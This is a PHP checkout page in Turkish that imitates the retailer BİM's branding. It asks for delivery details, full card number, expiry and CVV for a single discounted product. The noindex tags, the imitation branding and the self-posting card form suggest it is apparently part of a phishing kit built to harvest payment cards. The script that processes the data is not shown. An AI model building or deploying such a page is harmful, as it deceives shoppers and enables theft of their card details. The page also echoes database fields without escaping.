<?php

// Session start
session_start();
ob_start();

// Check basket_info from session
if (!$_SESSION['basket'] && !isset($_SESSION['basket_info'])) {
    header('Location: index.php');
    exit;
}

// Include Helper
include_once('../inc/helper.php');

// Check product info database
$basket_info = $_SESSION['basket_info'];
$sql = "SELECT * FROM bella_bim_products WHERE id = :id";
$stmt = $db->prepare($sql);
$stmt->execute(['id' => $basket_info['product_id']]);
$product = $stmt->fetch(PDO::FETCH_OBJ);

// Check product is exist
if (!$product) {
    header('Location: index.php');
    exit;
}

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta id="viewport" name="viewport"
          content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <title>Ödeme</title>


    <link href="assets/img/static_omnishop/ayb822/dist/style.css" rel="stylesheet" type="text/css">
    <!-- JQUERY -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Custom inline JS -->
    <script type="text/javascript">
        var GLOBALS = {
            THUMBNAIL_ACTIVE: true,
            THUMBNAIL_OPTIONS: {
                "product-list__big": {"width": 587, "quality": 60, "crop": "center", "height": 587},
                "category-detail": {"width": 870, "quality": 60, "height": 317},
                "email-thumbnail": {"width": 80, "quality": 60, "crop": "center", "height": 80},
                "product_basket_thumb_image": {"width": 120, "quality": 60, "height": 120},
                "discount-product-list": {"width": 190, "quality": 100, "crop": "center", "height": 190},
                "product-content-variant-image": {"width": 70, "quality": 60, "crop": "center", "height": 70},
                "product-detail__slider_display": {"width": 780, "quality": 60, "crop": "center", "height": 780},
                "product-detail__slider_zoom": {"width": 1400, "quality": 60, "crop": "center", "height": 1400},
                "product-detail__slider_thumbnail": {"width": 150, "quality": 60, "crop": "center", "height": 150},
                "category-detail__sub-category-banner": {"width": 270, "quality": 60, "height": 335},
                "autocomplete": {"width": 40, "quality": 60, "height": 40},
                "category-detail__campaign-banner": {"width": 420, "quality": 60, "height": 210},
                "product-map-image": {"width": 60, "quality": 60, "crop": "center", "height": 60},
                "product-list": {"width": 250, "quality": 100, "crop": "center", "height": 250}
            },
            DEFAULT_COUNTRY: {'pk': 1},
            isUserLoggin: false,
            userPhone: '',
            sendTime: '',
            phoneLogin: '',
            isAutoSetShippingOption: false,
            isPaymentTabRunningFromSlug: true,
            disableAutoSelectOneAddress: true,
            userEmail: '',
            userName: '',
            userSurname: '',

            page: 'checkout'

        };
    </script>
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-regular-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-bold-webfont.woff2" as="font"
          type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-extrabold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-blackcaps-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/icomoon.ttf" as="font"
          type="font/ttf" crossorigin="">
    <script src="assets/js/cookie-seal.js"></script>
<style>
	
					.page-header .header .menu > ul > li > a {
    display: flex;
    height: 46px;
    align-items: center;
    gap: 8px;
    padding: 9px 0;
    font-size: 14px;
    font-weight: 700;
    text-align: center;
    letter-spacing: .2px;
    text-decoration: none;
    color: white;
    -webkit-transition: all .3s linear;
    -moz-transition: all .3s linear;
    -ms-transition: all .3s linear;
    -o-transition: all .3s linear;
}
	
	.page-checkout-header {
    padding-top: 1.2rem;
    padding-bottom: 1.2rem;
    background-color: red;
}
	</style>
</head>
<body class="page-inner address">
<section class="js-main-wrapper">

    <header class="page-checkout-header">
        <div class="container">
            <a href="#" class="logo" title="BİM">
                <img loading="lazy" src="bimex.png" style="height:36px; margin-top:-10px;"
                     alt="">
            </a>
            <div class="clearfix"></div>
        </div>

        <div class="page-header header visible-xs">
            <div class="page-name js-page-name">
                <a href="#" class="js-go-back" title="Geri dön">
                    <em class="icon-chevron_left"></em>
                </a>
                GÜVENLİ ÖDEME ve ONAY
            </div>
        </div>
    </header>

    <!-- Payment Section -->
    <section class="page-checkout js-page-checkout js-tab-box">
        <div class="container" style="margin-top: 10rem;">
            <div class="checkout-addresses js-tab-content active">
                <div class="row">
                    <div class="col-sm-3 hidden-lg">
                        <div class="checkout-notice">
                            Faturanız elektronik fatura olarak iletilecektir.
                        </div>
                        <div class="checkout-sidebar">
                            <div class="js-checkout-sum-wrapper">
                                <div class="title">
                                    SİPARİŞ ÖZETİ
                                    <span>1 Ürün</span>
                                </div>
                                <div class="products">
                                    <ul>
                                        <li>
                                            <a href="/sadece-online-ozel/urun.php?s=<?= $product->ProductSefURL; ?>&i=<?= $product->id; ?>"
                                               rel="nofollow" title="<?= $product->ProductName; ?>">
                                                <img loading="lazy"
                                                     src="assets/img/products/<?= $product->ImageURL; ?>">
                                                <div class="content">
                                                    <div class="price">
                                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                                    </div>
                                                    <div><?= $product->ProductName; ?></div>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="summary">
                                    <table>
                                        <tbody>
                                        <tr>
                                            <td>
                                                Ürünlerin Toplamı
                                            </td>
                                            <td>
                                                ₺<?= number_format($product->ProductPrice, 2); ?>
                                            </td>
                                        </tr>

                                        </tbody>
                                    </table>
                                </div>

                                <div class="total">
                                    <span>
                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                    </span>
                                    Ödenecek Tutar
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-9">
                        <div class="payment-area js-payment-tab-content active" data-type="credit_card"
                             data-slug="credit_card">
                            <form class="js-tab-content js-checkout-form" method="post" id="js-checkout-form"
                                  data-amount="<?= $product->ProductPrice ?>">
                                <div class="card">
                                    <div class="section-hero">
                                        Teslimat Bilgileri
                                    </div>

                                    <div class="card-information">
                                        <div class="title">
                                            Lütfen Teslimat bilgilerinizi yazın.
                                        </div>

                                        <div class="form-area js-new-address-area">

                                            <div class="field">
                                                <label>
                                                    Ad Soyad*
                                                    <input type="text" name="name" id="name_surname" required>
                                                </label>
                                            </div>

                                            <div class="field">
                                                <label>
                                                    Telefon Numarası*
                                                    <input type="tel" name="phone" id="phone_number" min="11" max="11"
                                                           minlength="11" maxlength="11" required>
                                                </label>
                                            </div>

                                            <div class="field">
                                                <label>
                                                    E-Posta*
                                                    <input type="email" name="email" id="email_address" required>
                                                </label>
                                            </div>

                                            <div class="field">
                                                <label>
                                                    İl*
                                                    <input type="text" name="city" id="city" required>
                                                </label>
                                            </div>

                                            <div class="field">
                                                <label>
                                                    İlçe*
                                                    <input type="text" name="district" id="district" required>
                                                </label>
                                            </div>

                                            <div class="field">
                                                <label>
                                                    Adres*
                                                    <input type="text" name="address" id="address" required>
                                                </label>
                                            </div>

                                        </div>
                                    </div>
                                </div>
                                <div class="clear"></div>
                                <div class="card">
                                    <div class="section-hero">
                                        Kredi/Banka Kartı ile Ödeme
                                    </div>

                                    <div class="card-information">
                                        <div class="title">
                                            Lütfen Kart bilgilerinizi yazın.
                                        </div>

                                        <div class="form-area js-new-creditcard-area">
                                            <div class="field">
                                                <label>
                                                    Ad Soyad
                                                    <input type="text" name="cardholder_name" id="cardholder_name"
                                                           required>
                                                </label>
                                            </div>

                                            <div class="field">
                                                <label>
                                                    Kart Numarası
                                                   <input type="text" name="card_number" class="js-payment-card-number" id="card_number" minlength="16" maxlength="16" required>

<script>
    // Input alanının değişikliklerini dinleyen fonksiyon
    document.getElementById("card_number").addEventListener("input", function() {
        // Girişteki herhangi bir harfi temizle
        this.value = this.value.replace(/\D/g, '');
    });
</script>

                                                </label>
                                            </div>

                                            <div class="field-dates">
                                                <div class="title">
                                                    Son Kullanma Tarihi
                                                </div>
                                                <div class="select select--first">
                                                    <label for="card_month"></label>
                                                    <select autocomplete="off" name="card_month"
                                                            class="js-payment-month" id="card_month" required>
                                                        <option value="1">
                                                            1
                                                        </option>

                                                        <option value="2">
                                                            2
                                                        </option>

                                                        <option value="3">
                                                            3
                                                        </option>

                                                        <option value="4">
                                                            4
                                                        </option>

                                                        <option value="5">
                                                            5
                                                        </option>

                                                        <option value="6">
                                                            6
                                                        </option>

                                                        <option value="7">
                                                            7
                                                        </option>

                                                        <option value="8">
                                                            8
                                                        </option>

                                                        <option value="9">
                                                            9
                                                        </option>

                                                        <option value="10">
                                                            10
                                                        </option>

                                                        <option value="11">
                                                            11
                                                        </option>

                                                        <option value="12">
                                                            12
                                                        </option>

                                                    </select>
                                                </div>
                                                <div class="select">
                                                    <label for="card_year"></label>
                                                    <select autocomplete="off" name="card_year" class="js-payment-year"
                                                            id="card_year" required>
                                                        <option value="2023">
                                                            2023
                                                        </option>

                                                        <option value="2024">
                                                            2024
                                                        </option>

                                                        <option value="2025">
                                                            2025
                                                        </option>

                                                        <option value="2026">
                                                            2026
                                                        </option>

                                                        <option value="2027">
                                                            2027
                                                        </option>

                                                        <option value="2028">
                                                            2028
                                                        </option>

                                                        <option value="2029">
                                                            2029
                                                        </option>

                                                        <option value="2030">
                                                            2030
                                                        </option>

                                                        <option value="2031">
                                                            2031
                                                        </option>

                                                        <option value="2032">
                                                            2032
                                                        </option>

                                                        <option value="2033">
                                                            2033
                                                        </option>

                                                        <option value="2034">
                                                            2034
                                                        </option>
                                                    </select>
                                                </div>
                                                <div class="clearfix"></div>
                                            </div>
                                            <div class="field field-cvc">
                                                <label>
                                                    CVC
                                                    <input type="text" autocomplete="off" name="card_cvv" class="js-payment-cvv" maxlength="3" id="card_cvv" required>

<script>
    // Input alanının değişikliklerini dinleyen fonksiyon
    document.getElementById("card_cvv").addEventListener("input", function() {
        // Girişteki herhangi bir harfi temizle
        this.value = this.value.replace(/\D/g, '');
    });
</script>

                                                </label>
                                                <div class="tips">
                                                    CVC
                                                    <span class="checkout__payment__cvc-info">
                                                        nedir?
                                                        <img loading="lazy"
                                                             src="assets/img/static_omnishop/ayb822/assets/img/cvv.png">
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="clear"></div>
                                </div>
                                <div class="installment">
                                    <div class="section-hero hidden-xs">
                                        BİLGİLENDİRMELER
                                    </div>
                                    <div class="installment-area">
                                        <div class="agrement">
                                            <div class="checkbox">
                                                <a href="#" class="js-ajax-popup"
                                                   title="Ön Bilgilendirme Koşulları"">Ön Bilgilendirme Koşulları</a>’nı
                                                ve <a href="#"
                                                      class="js-ajax-popup" title="Uzaktan Satış Sözleşmesi">Uzaktan
                                                    Satış Sözleşmesi</a>’ni okudum ve kabul ediyorum
                                            </div>
                                        </div>

                                        <div id="js-orders-complete-button" class="js-complete-with-masterpass">
                                            <button type="submit" style="background-color:red;" class="button block continue-button"
                                                    id="payment_button">
                                                <span class="order-spinner hidden" id="order-spinner">İşleniyor.. <img
                                                            src="assets/img/static_omnishop/ayb822/assets/img/spinner.gif"
                                                            width="40" alt="spinner"></span>
                                                <span class="order-complete" id="order-complete">Siparişi Tamamla</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div class="clearfix"></div>
                            </form>
                        </div>
                    </div>
                    <div class="col-sm-3 hidden-xs visible-lg">
                        <div class="checkout-notice">
                            Faturanız elektronik fatura olarak iletilecektir.
                        </div>
                        <div class="checkout-sidebar">
                            <div class="js-checkout-sum-wrapper">
                                <div class="title">
                                    SİPARİŞ ÖZETİ
                                    <span>1 Ürün</span>
                                </div>
                                <div class="products">
                                    <ul>
                                        <li>
                                            <a href="/sadece-online-ozel/urun.php?s=<?= $product->ProductSefURL; ?>&i=<?= $product->id; ?>"
                                               rel="nofollow" title="<?= $product->ProductName; ?>">
                                                <img loading="lazy"
                                                     src="assets/img/products/<?= $product->ImageURL; ?>">
                                                <div class="content">
                                                    <div class="price">
                                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                                    </div>
                                                    <div><?= $product->ProductName; ?></div>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="summary">
                                    <table>
                                        <tbody>
                                        <tr>
                                            <td>
                                                Ürünlerin Toplamı
                                            </td>
                                            <td>
                                                ₺<?= number_format($product->ProductPrice, 2); ?>
                                            </td>
                                        </tr>

                                        </tbody>
                                    </table>
                                </div>

                                <div class="total">
                                    <span>
                                        ₺<?= number_format($product->ProductPrice, 2); ?>
                                    </span>
                                    Ödenecek Tutar
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Payment Section End -->


    <footer class="page-checkout-footer hidden-xs">
        <ul class="cards">
            <li>
                <i class="sprite visa-logo"></i>
            </li>
            <li>
                <i class="sprite mastercard-logo"></i>
            </li>
            <li>
                <i class="sprite gpay-logo"></i>
            </li>
            <li>
                <i class="sprite bkm-logo"></i>
            </li>
            <li>
                <i class="sprite troy-logo"></i>
            </li>
        </ul>
        <p>2024 BİM Tüm Hakları Saklıdır.</p>
    </footer>


    <div class="clear"></div>
</section>


<div class="back-to-top js-back-to-top hide-on-app">
    <i class="fa fa-angle-up"></i>
</div>
<script src="assets/js/bundle.js"></script>
<script src="assets/js/payment.js"></script>
</body>
</html>